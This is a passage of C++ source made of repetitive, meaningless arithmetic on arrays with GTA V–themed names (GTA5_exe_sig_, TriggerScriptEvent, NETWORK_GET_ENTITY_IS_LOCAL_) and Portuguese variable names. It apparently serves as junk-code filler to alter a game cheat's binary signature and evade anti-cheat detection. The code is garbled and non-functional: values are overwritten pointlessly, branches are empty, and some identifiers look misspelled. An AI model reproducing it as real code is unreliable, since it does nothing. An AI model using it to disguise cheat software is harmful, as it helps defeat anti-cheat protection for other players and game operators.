				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			std::string Modelo = Extern_Reader::INIFile::String::LerString(buffer, "Modelo");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
